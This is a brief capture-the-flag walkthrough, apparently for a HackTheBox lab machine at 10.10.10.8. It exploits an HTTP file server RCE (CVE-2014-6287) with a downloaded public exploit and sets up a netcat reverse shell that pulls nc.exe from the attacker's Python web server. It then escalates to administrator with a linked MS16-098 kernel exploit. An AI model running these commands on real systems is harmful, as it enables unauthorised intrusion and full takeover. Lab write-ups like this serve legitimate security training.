Only one port is open. Nmap revale the Http Version.
With that version i found a RCE exploit in:
https://gist.github.com/AfroThundr3007730/834858b381634de8417f301620a2ccf9

Download the exploit:
```bash wget https://gist.githubusercontent.com/AfroThundr3007730/834858b381634de8417f301620a2ccf9/raw/783473905951169e49afaf5958e89b23f5a8743f/cve-2014-6287.py

```

Before launcing the exploit i first edited as follows:
```python
    ip_addr = "10.10.14.7:8000" #local IP address
    ip_addr1="10.10.14.7"
    local_port = "443" # Local Port number
```

In another terminal i hosted nc.exe and started python server in the same working directory:
```bash
    python -m SimpleHTTPServer
```
And another terminal listening in port 443:
```bash
nc -lvp 443
```
Finally executing the exploit give a shell:
```bash
python cve-2014-6287.py 10.10.10.8 80
```

#Escalation
We can escalate in two way:
https://gist.github.com/intrd/6dda33f61dca560e6996d01c62203374

And 
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098

For quick escalation download bfill from second link, upload to the box and execute like:
```bash
.\bfill.exe 
```
And you are root :).
